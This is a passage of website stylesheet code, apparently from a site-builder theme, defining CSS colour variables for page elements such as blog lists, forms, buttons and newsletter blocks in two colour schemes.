ry-block-limited-availability-label-color:hsla(var(--safeInverseAccent-hsl),1);--tertiaryButtonBackgroundColor:hsla(var(--safeInverseAccent-hsl),1);--tertiaryButtonTextColor:hsla(var(--accent-hsl),1);--text-highlight-color:hsla(var(--safeInverseAccent-hsl),1);--text-highlight-color-on-background:hsla(var(--accent-hsl),1);--tweak-accordion-block-background-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-accordion-block-divider-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-accordion-block-divider-color-on-background:hsla(var(--accent-hsl),1);--tweak-accordion-block-icon-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-accordion-block-icon-color-on-background:hsla(var(--accent-hsl),1);--tweak-blog-alternating-side-by-side-list-excerpt-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-alternating-side-by-side-list-meta-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-alternating-side-by-side-list-read-more-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-alternating-side-by-side-list-title-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-basic-grid-list-excerpt-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-basic-grid-list-meta-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-basic-grid-list-read-more-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-basic-grid-list-title-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-item-author-profile-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-item-comment-meta-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-item-comment-text-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-item-meta-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-item-pagination-icon-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-item-pagination-meta-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-item-pagination-title-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-item-title-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-masonry-list-excerpt-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-masonry-list-meta-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-masonry-list-read-more-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-masonry-list-title-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-side-by-side-list-excerpt-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-side-by-side-list-meta-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-side-by-side-list-read-more-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-side-by-side-list-title-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-single-column-list-excerpt-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-single-column-list-meta-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-single-column-list-read-more-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-single-column-list-title-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-content-link-block-title-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-events-item-pagination-date-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-events-item-pagination-icon-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-events-item-pagination-title-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-form-block-background-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-form-block-button-background-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-form-block-button-background-color-on-background:hsla(var(--accent-hsl),1);--tweak-form-block-button-text-color:hsla(var(--accent-hsl),1);--tweak-form-block-button-text-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-form-block-caption-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-form-block-caption-color-on-background:hsla(var(--accent-hsl),1);--tweak-form-block-description-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-form-block-description-color-on-background:hsla(var(--accent-hsl),1);--tweak-form-block-option-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-form-block-option-color-on-background:hsla(var(--accent-hsl),1);--tweak-form-block-survey-title-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-form-block-survey-title-color-on-background:hsla(var(--accent-hsl),1);--tweak-form-block-title-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-form-block-title-color-on-background:hsla(var(--accent-hsl),1);--tweak-form-block-field-fill-color:hsla(var(--white-hsl),1);--tweak-form-block-field-fill-color-hsl:var(--white-hsl);--tweak-form-block-field-fill-color-a:1;--tweak-form-block-field-border-color:hsla(var(--black-hsl),1);--tweak-form-block-field-border-color-hsl:var(--black-hsl);--tweak-form-block-field-border-color-a:1;--tweak-form-block-field-input-color:hsla(var(--black-hsl),1);--tweak-form-block-field-input-color-hsl:var(--black-hsl);--tweak-form-block-field-input-color-a:1;--tweak-form-block-field-accessory-color:hsla(var(--black-hsl),1);--tweak-form-block-field-fill-color-on-background:hsla(var(--darkAccent-hsl),1);--tweak-form-block-field-fill-color-on-background-hsl:var(--darkAccent-hsl);--tweak-form-block-field-fill-color-on-background-a:1;--tweak-form-block-field-border-color-on-background:hsla(var(--accent-hsl),1);--tweak-form-block-field-border-color-on-background-hsl:var(--accent-hsl);--tweak-form-block-field-border-color-on-background-a:1;--tweak-form-block-field-input-color-on-background:hsla(var(--accent-hsl),1);--tweak-form-block-field-input-color-on-background-hsl:var(--accent-hsl);--tweak-form-block-field-input-color-on-background-a:1;--tweak-form-block-field-accessory-color-on-background:hsla(var(--accent-hsl),1);--tweak-gallery-icon-background-color:hsla(var(--accent-hsl),1);--tweak-gallery-icon-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-gallery-lightbox-background-color:hsla(var(--accent-hsl),1);--tweak-gallery-lightbox-icon-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-heading-extra-large-color-on-background:hsla(var(--accent-hsl),1);--tweak-heading-large-color-on-background:hsla(var(--accent-hsl),1);--tweak-heading-medium-color-on-background:hsla(var(--accent-hsl),1);--tweak-heading-small-color-on-background:hsla(var(--accent-hsl),1);--tweak-line-block-line-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-marquee-block-background-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-marquee-block-heading-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-marquee-block-heading-color-on-background:hsla(var(--accent-hsl),1);--tweak-marquee-block-paragraph-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-marquee-block-paragraph-color-on-background:hsla(var(--accent-hsl),1);--tweak-menu-block-item-description-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-menu-block-item-price-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-menu-block-item-title-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-menu-block-nav-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-menu-block-title-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-newsletter-block-background-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-newsletter-block-button-background-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-newsletter-block-button-background-color-on-background:hsla(var(--accent-hsl),1);--tweak-newsletter-block-button-text-color:hsla(var(--accent-hsl),1);--tweak-newsletter-block-button-text-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-newsletter-block-description-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-newsletter-block-description-color-on-background:hsla(var(--accent-hsl),1);--tweak-newsletter-block-footnote-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-newsletter-block-footnote-color-on-background:hsla(var(--accent-hsl),1);--tweak-newsletter-block-title-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-newsletter-block-title-color-on-background:hsla(var(--accent-hsl),1);--tweak-paragraph-large-color-on-background:hsla(var(--accent-hsl),1);--tweak-paragraph-link-color-on-background:hsla(var(--accent-hsl),1);--tweak-paragraph-medium-color-on-background:hsla(var(--accent-hsl),1);--tweak-paragraph-small-color-on-background:hsla(var(--accent-hsl),1);--tweak-portfolio-item-pagination-icon-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-portfolio-item-pagination-meta-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-portfolio-item-pagination-title-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-product-basic-item-breadcumb-nav-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-product-basic-item-description-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-product-basic-item-gallery-controls-color:hsla(var(--safeInverseLightAccent-hsl),1);--tweak-product-basic-item-price-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-product-basic-item-sale-price-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-product-basic-item-scarcity-color:hsla(var(--white-hsl),1);--tweak-product-basic-item-title-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-product-basic-item-variant-fields-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-product-grid-text-below-list-category-nav-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-product-grid-text-below-list-pagination-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-product-grid-text-below-list-price-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-product-grid-text-below-list-sale-price-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-scarcity-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-product-grid-text-below-list-status-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-title-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-product-quick-view-button-color:hsla(var(--black-hsl),1);--tweak-product-quick-view-lightbox-controls-color:hsla(var(--black-hsl),1);--tweak-product-quick-view-lightbox-overlay-color:hsla(var(--white-hsl),1);--tweak-quote-block-background-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-quote-block-source-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-quote-block-source-color-on-background:hsla(var(--accent-hsl),1);--tweak-quote-block-text-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-quote-block-text-color-on-background:hsla(var(--accent-hsl),1);--tweak-summary-block-background-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-summary-block-excerpt-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-summary-block-excerpt-color-on-background:hsla(var(--accent-hsl),1);--tweak-summary-block-header-text-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-summary-block-header-text-color-on-background:hsla(var(--accent-hsl),1);--tweak-summary-block-primary-metadata-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-summary-block-primary-metadata-color-on-background:hsla(var(--accent-hsl),1);--tweak-summary-block-read-more-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-summary-block-read-more-color-on-background:hsla(var(--accent-hsl),1);--tweak-summary-block-secondary-metadata-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-summary-block-secondary-metadata-color-on-background:hsla(var(--accent-hsl),1);--tweak-summary-block-title-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-summary-block-title-color-on-background:hsla(var(--accent-hsl),1);--tweak-text-block-background-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-video-item-description-color:hsla(var(--white-hsl),1);--tweak-video-item-meta-color:hsla(var(--white-hsl),1);--tweak-video-item-pagination-icon-color:hsla(var(--white-hsl),1);--tweak-video-item-pagination-title-color:hsla(var(--white-hsl),1);--tweak-video-item-title-color:hsla(var(--white-hsl),1);--video-grid-basic-description-color:hsla(var(--white-hsl),1);--video-grid-basic-meta-color:hsla(var(--white-hsl),1);--video-grid-basic-title-color:hsla(var(--white-hsl),1);--video-grid-category-nav-color:hsla(var(--white-hsl),1);}.bright-inverse {--announcement-bar-background-color:hsla(var(--accent-hsl),1);--announcement-bar-text-color:hsla(var(--safeInverseAccent-hsl),1);--backgroundOverlayColor:hsla(var(--safeInverseAccent-hsl),1);--course-item-nav-active-lesson-background-color:hsla(var(--darkAccent-hsl),1);--course-item-nav-active-lesson-text-color:hsla(var(--white-hsl),1);--course-item-nav-background-color:hsla(var(--lightAccent-hsl),1);--course-item-nav-border-color:hsla(var(--black-hsl),0.25);--course-item-nav-text-color:hsla(var(--black-hsl),1);--course-list-course-progress-bar-color:hsla(var(--darkAccent-hsl),1);--course-list-course-item-background:hsla(var(--lightAccent-hsl),1);--course-list-course-item-hover-background:hsla(var(--lightAccent-hsl),0.95);--course-list-course-item-text-color:hsla(var(--black-hsl),1);--course-list-course-chapter-divider-color:hsla(var(--darkAccent-hsl),1);--course-list-grid-layout-chapter-divider-color:hsla(var(--accent-hsl),1);--course-list-grid-layout-course-item-background-color:hsla(var(--lightAccent-hsl),1);--course-list-grid-layout-course-item-hover-background-color:hsla(var(--lightAccent-hsl),0.95);--course-list-grid-layout-course-item-text-color:hsla(var(--black-hsl),1);--course-list-grid-layout-course-item-border-color:hsla(var(--darkAccent-hsl),1);--gradientHeaderBackgroundColor:hsla(var(--white-hsl),1);--gradientHeaderBorderColor:hsla(var(--black-hsl),1);--gradientHeaderDropShadowColor:hsla(var(--black-hsl),1);--gradientHeaderNavigationColor:hsla(var(--black-hsl),1);--headerDropShadowColor:hsla(var(--black-hsl),1);--headerBorderColor:hsla(var(--black-hsl),1);--headingExtraLargeColor:hsla(var(--accent-hsl),1);--headingLargeColor:hsla(var(--accent-hsl),1);--headingLinkColor:hsla(var(--accent-hsl),1);--headingMediumColor:hsla(var(--accent-hsl),1);--headingSmallColor:hsla(var(--accent-hsl),1);--image-block-card-image-button-bg-color:hsla(var(--accent-hsl),1);--image-block-card-image-button-text-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-card-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-card-image-subtitle-color:hsla(var(--accent-hsl),1);--image-block-card-image-title-bg-color:hsla(var(--safeInverseAccent-hsl),0);--image-block-card-image-title-color:hsla(var(--accent-hsl),1);--image-block-card-inline-link-color:hsla(var(--accent-hsl),1);--image-block-collage-background-color:hsla(var(--accent-hsl),1);--image-block-collage-image-button-bg-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-collage-image-button-text-color:hsla(var(--accent-hsl),1);--image-block-collage-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-collage-image-subtitle-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-collage-image-title-bg-color:hsla(var(--safeInverseAccent-hsl),0);--image-block-collage-image-title-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-collage-inline-link-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-overlap-image-button-bg-color:hsla(var(--accent-hsl),1);--image-block-overlap-image-button-text-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-overlap-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-overlap-image-subtitle-color:hsla(var(--accent-hsl),1);--image-block-overlap-image-title-bg-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-overlap-image-title-color:hsla(var(--accent-hsl),1);--image-block-overlap-inline-link-color:hsla(var(--accent-hsl),1);--image-block-overlay-color:hsla(var(--black-hsl),0.5);--image-block-poster-image-button-bg-color:hsla(var(--accent-hsl),1);--image-block-poster-image-button-text-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-poster-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-poster-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-poster-image-title-bg-color-v2:hsla(var(--safeInverseAccent-hsl),0);--image-block-poster-image-title-color:hsla(var(--white-hsl),1);--image-block-poster-inline-link-color:hsla(var(--white-hsl),1);--image-block-stack-image-button-bg-color:hsla(var(--accent-hsl),1);--image-block-stack-image-button-text-color:hsla(var(--safeInverseAccent-hsl),1);--image-block-stack-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-stack-image-subtitle-color:hsla(var(--accent-hsl),1);--image-block-stack-image-title-bg-color:hsla(var(--safeInverseAccent-hsl),0);--image-block-stack-image-title-color:hsla(var(--accent-hsl),1);--image-block-stack-inline-link-color:hsla(var(--accent-hsl),1);--list-section-banner-slideshow-arrow-background-color:hsla(var(--accent-hsl),1);--list-section-banner-slideshow-arrow-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-banner-slideshow-button-background-color:hsla(var(--accent-hsl),1);--list-section-banner-slideshow-button-text-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-banner-slideshow-card-button-background-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-banner-slideshow-card-button-text-color:hsla(var(--accent-hsl),1);--list-section-banner-slideshow-card-color:hsla(var(--accent-hsl),1);--list-section-banner-slideshow-card-description-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-banner-slideshow-card-description-link-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-banner-slideshow-card-title-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-banner-slideshow-description-color:hsla(var(--accent-hsl),1);--list-section-banner-slideshow-title-color:hsla(var(--accent-hsl),1);--list-section-carousel-arrow-background-color:hsla(var(--accent-hsl),1);--list-section-carousel-arrow-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-carousel-button-background-color:hsla(var(--accent-hsl),1);--list-section-carousel-button-text-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-carousel-card-button-background-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-carousel-card-button-text-color:hsla(var(--accent-hsl),1);--list-section-carousel-card-color:hsla(var(--accent-hsl),1);--list-section-carousel-card-description-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-carousel-card-description-link-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-carousel-card-title-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-carousel-description-color:hsla(var(--accent-hsl),1);--list-section-carousel-title-color:hsla(var(--accent-hsl),1);--list-section-simple-button-background-color:hsla(var(--accent-hsl),1);--list-section-simple-button-text-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-simple-card-button-background-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-simple-card-button-text-color:hsla(var(--accent-hsl),1);--list-section-simple-card-color:hsla(var(--accent-hsl),1);--list-section-simple-card-description-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-simple-card-description-link-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-simple-card-title-color:hsla(var(--safeInverseAccent-hsl),1);--list-section-simple-description-color:hsla(var(--accent-hsl),1);--list-section-simple-title-color:hsla(var(--accent-hsl),1);--list-section-title-color:hsla(var(--accent-hsl),1);--menuOverlayBackgroundColor:hsla(var(--safeInverseAccent-hsl),1);--menuOverlayButtonBackgroundColor:hsla(var(--accent-hsl),1);--menuOverlayButtonTextColor:hsla(var(--safeInverseAccent-hsl),1);--menuOverlayNavigationLinkColor:hsla(var(--accent-hsl),1);--navigationLinkColor:hsla(var(--accent-hsl),1);--paragraphLargeColor:hsla(var(--accent-hsl),1);--paragraphLinkColor:hsla(var(--accent-hsl),1);--paragraphMediumColor:hsla(var(--accent-hsl),1);--paragraphSmallColor:hsla(var(--accent-hsl),1);--portfolio-grid-basic-title-color:hsla(var(--accent-hsl),1);--portfolio-grid-overlay-overlay-color:hsla(var(--safeInverseAccent-hsl),1);--portfolio-grid-overlay-title-color:hsla(var(--accent-hsl),1);--portfolio-hover-follow-title-color:hsla(var(--accent-hsl),1);--portfolio-hover-static-title-color:hsla(var(--accent-hsl),1);--portfolio-index-background-title-color:hsla(var(--accent-hsl),1);--primaryButtonBackgroundColor:hsla(var(--accent-hsl),1);--primaryButtonTextColor:hsla(var(--safeInverseAccent-hsl),1);--secondaryButtonBackgroundColor:hsla(var(--accent-hsl),1);--secondaryButtonTextColor:hsla(var(--safeInverseAccent-hsl),1);--section-divider-stroke-color:hsla(var(--accent-hsl),1);--section-inset-border-color:hsla(var(--safeInverseAccent-hsl),1);--shape-block-background-color:hsla(var(--accent-hsl),1);--shape-block-dropshadow-color:hsla(var(--accent-hsl),1);--shape-block-stroke-color:hsla(var(--black-hsl),1);--siteBackgroundColor:hsla(var(--safeInverseAccent-hsl),1);--siteTitleColor:hsla(var(--accent-hsl),1);--social-links-block-main-icon-color:hsla(var(--accent-hsl),1);--social-links-block-secondary-icon-color:hsla(var(--safeInverseAccent-hsl),1);--solidHeaderBackgroundColor:hsla(var(--white-hsl),1);--solidHeaderBorderColor:hsla(var(--black-hsl),1);--solidHeaderDropShadowColor:hsla(var(--black-hsl),1);--solidHeaderNavigationColor:hsla(var(--black-hsl),1);--summary-block-limited-availability-label-color:hsla(var(--accent-hsl),1);--tertiaryButtonBackgroundColor:hsla(var(--accent-hsl),1);--tertiaryButtonTextColor:hsla(var(--safeInverseAccent-hsl),1);--text-highlight-color:hsla(var(--accent-hsl),1);--text-highlight-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-accordion-block-background-color:hsla(var(--accent-hsl),1);--tweak-accordion-block-divider-color:hsla(var(--accent-hsl),1);--tweak-accordion-block-divider-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-accordion-block-icon-color:hsla(var(--accent-hsl),1);--tweak-accordion-block-icon-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-blog-alternating-side-by-side-list-excerpt-color:hsla(var(--accent-hsl),1);--tweak-blog-alternating-side-by-side-list-meta-color:hsla(var(--accent-hsl),1);--tweak-blog-alternating-side-by-side-list-read-more-color:hsla(var(--accent-hsl),1);--tweak-blog-alternating-side-by-side-list-title-color:hsla(var(--accent-hsl),1);--tweak-blog-basic-grid-list-excerpt-color:hsla(var(--accent-hsl),1);--tweak-blog-basic-grid-list-meta-color:hsla(var(--accent-hsl),1);--tweak-blog-basic-grid-list-read-more-color:hsla(var(--accent-hsl),1);--tweak-blog-basic-grid-list-title-color:hsla(var(--accent-hsl),1);--tweak-blog-item-author-profile-color:hsla(var(--accent-hsl),1);--tweak-blog-item-comment-meta-color:hsla(var(--accent-hsl),1);--tweak-blog-item-comment-text-color:hsla(var(--accent-hsl),1);--tweak-blog-item-meta-color:hsla(var(--accent-hsl),1);--tweak-blog-item-pagination-icon-color:hsla(var(--accent-hsl),1);--tweak-blog-item-pagination-meta-color:hsla(var(--accent-hsl),1);--tweak-blog-item-pagination-title-color:hsla(var(--accent-hsl),1);--tweak-blog-item-title-color:hsla(var(--accent-hsl),1);--tweak-blog-masonry-list-excerpt-color:hsla(var(--accent-hsl),1);--tweak-blog-masonry-list-meta-color:hsla(var(--accent-hsl),1);--tweak-blog-masonry-list-read-more-color:hsla(var(--accent-hsl),1);--tweak-blog-masonry-list-title-color:hsla(var(--accent-hsl),1);--tweak-blog-side-by-side-list-excerpt-color:hsla(var(--accent-hsl),1);--tweak-blog-side-by-side-list-meta-color:hsla(var(--accent-hsl),1);--tweak-blog-side-by-side-list-read-more-color:hsla(var(--accent-hsl),1);--tweak-blog-side-by-side-list-title-color:hsla(var(--accent-hsl),1);--tweak-blog-single-column-list-excerpt-color:hsla(var(--accent-hsl),1);--tweak-blog-single-column-list-meta-color:hsla(var(--accent-hsl),1);--tweak-blog-single-column-list-read-more-color:hsla(var(--accent-hsl),1);--tweak-blog-single-column-list-title-color:hsla(var(--accent-hsl),1);--tweak-content-link-block-title-color:hsla(var(--accent-hsl),1);--tweak-events-item-pagination-date-color:hsla(var(--accent-hsl),1);--tweak-events-item-pagination-icon-color:hsla(var(--accent-hsl),1);--tweak-events-item-pagination-title-color:hsla(var(--accent-hsl),1);--tweak-form-block-background-color:hsla(var(--accent-hsl),1);--tweak-form-block-button-background-color:hsla(var(--accent-hsl),1);--tweak-form-block-button-background-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-form-block-button-text-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-form-block-button-text-color-on-background:hsla(var(--accent-hsl),1);--tweak-form-block-caption-color:hsla(var(--accent-hsl),1);--tweak-form-block-caption-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-form-block-description-color:hsla(var(--accent-hsl),1);--tweak-form-block-description-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-form-block-option-color:hsla(var(--accent-hsl),1);--tweak-form-block-option-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-form-block-survey-title-color:hsla(var(--accent-hsl),1);--tweak-form-block-survey-title-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-form-block-title-color:hsla(var(--accent-hsl),1);--tweak-form-block-title-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-form-block-field-fill-color:hsla(var(--darkAccent-hsl),1);--tweak-form-block-field-fill-color-hsl:var(--darkAccent-hsl);--tweak-form-block-field-fill-color-a:1;--tweak-form-block-field-border-color:hsla(var(--accent-hsl),1);--tweak-form-block-field-border-color-hsl:var(--accent-hsl);--tweak-form-block-field-border-color-a:1;--tweak-form-block-field-input-color:hsla(var(--accent-hsl),1);--tweak-form-block-field-input-color-hsl:var(--accent-hsl);--tweak-form-block-field-input-color-a:1;--tweak-form-block-field-accessory-color:hsla(var(--accent-hsl),1);--tweak-form-block-field-fill-color-on-background:hsla(var(--white-hsl),1);--tweak-form-block-field-fill-color-on-background-hsl:var(--white-hsl);--tweak-form-block-field-fill-color-on-background-a:1;--tweak-form-block-field-border-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-border-color-on-background-hsl:var(--black-hsl);--tweak-form-block-field-border-color-on-background-a:1;--tweak-form-block-field-input-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-input-color-on-background-hsl:var(--black-hsl);--tweak-form-block-field-input-color-on-background-a:1;--tweak-form-block-field-accessory-color-on-background:hsla(var(--black-hsl),1);--tweak-gallery-icon-background-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-gallery-icon-color:hsla(var(--accent-hsl),1);--tweak-gallery-lightbox-background-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-gallery-lightbox-icon-color:hsla(var(--accent-hsl),1);--tweak-heading-extra-large-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-heading-large-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-heading-medium-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-heading-small-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-line-block-line-color:hsla(var(--accent-hsl),1);--tweak-marquee-block-background-color:hsla(var(--accent-hsl),1);--tweak-marquee-block-heading-color:hsla(var(--accent-hsl),1);--tweak-marquee-block-heading-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-marquee-block-paragraph-color:hsla(var(--accent-hsl),1);--tweak-marquee-block-paragraph-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-menu-block-item-description-color:hsla(var(--accent-hsl),1);--tweak-menu-block-item-price-color:hsla(var(--accent-hsl),1);--tweak-menu-block-item-title-color:hsla(var(--accent-hsl),1);--tweak-menu-block-nav-color:hsla(var(--accent-hsl),1);--tweak-menu-block-title-color:hsla(var(--accent-hsl),1);--tweak-newsletter-block-background-color:hsla(var(--accent-hsl),1);--tweak-newsletter-block-button-background-color:hsla(var(--accent-hsl),1);--tweak-newsletter-block-button-background-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-newsletter-block-button-text-color:hsla(var(--safeInverseAccent-hsl),1);--tweak-newsletter-block-button-text-color-on-background:hsla(var(--accent-hsl),1);--tweak-newsletter-block-description-color:hsla(var(--accent-hsl),1);--tweak-newsletter-block-description-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-newsletter-block-footnote-color:hsla(var(--accent-hsl),1);--tweak-newsletter-block-footnote-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-newsletter-block-title-color:hsla(var(--accent-hsl),1);--tweak-newsletter-block-title-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-paragraph-large-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-paragraph-link-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-paragraph-medium-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-paragraph-small-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-portfolio-item-pagination-icon-color:hsla(var(--accent-hsl),1);--tweak-portfolio-item-pagination-meta-color:hsla(var(--accent-hsl),1);--tweak-portfolio-item-pagination-title-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-breadcumb-nav-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-description-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-gallery-controls-color:hsla(var(--safeInverseLightAccent-hsl),1);--tweak-product-basic-item-price-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-sale-price-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-scarcity-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-title-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-variant-fields-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-category-nav-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-pagination-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-price-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-sale-price-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-scarcity-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-status-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-title-color:hsla(var(--accent-hsl),1);--tweak-product-quick-view-button-color:hsla(var(--black-hsl),1);--tweak-product-quick-view-lightbox-controls-color:hsla(var(--black-hsl),1);--tweak-product-quick-view-lightbox-overlay-color:hsla(var(--white-hsl),1);--tweak-quote-block-background-color:hsla(var(--accent-hsl),1);--tweak-quote-block-source-color:hsla(var(--accent-hsl),1);--tweak-quote-block-source-color-on-background:hsla(var(--safeInverseAccent-hsl),1);--tweak-quote-block-text-color:hsla(var(--accent-hsl),1);--tweak-quote-block-text-color-on-background: